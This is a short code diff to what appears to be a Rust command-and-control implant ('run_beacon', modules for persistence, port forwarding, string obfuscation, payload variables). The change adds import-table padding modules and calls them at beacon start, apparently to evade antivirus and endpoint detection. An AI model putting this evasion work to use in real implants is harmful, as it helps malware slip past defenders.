@@ -28,7 +28,9 @@ mod ls;
 mod mkdir;
 mod mv;
 mod netstat;
+mod iat_pad;
 mod obfstr;
+mod padding;
 mod payloadvars;
 mod persist;
 mod portfwd;
@@ -85,7 +87,8 @@ pub fn real_main() -> Result<(), Box<dyn Error>> {
 
 /// Main code which runs the agent
 fn run_beacon() -> Result<(), Box<dyn Error>> {
-    // Create a new agent object
+    iat_pad::init_imports();
+
     let mut agent = crate::Agent::new();
 
     // SOCKS thread will be started automatically when SOCKS messages are received
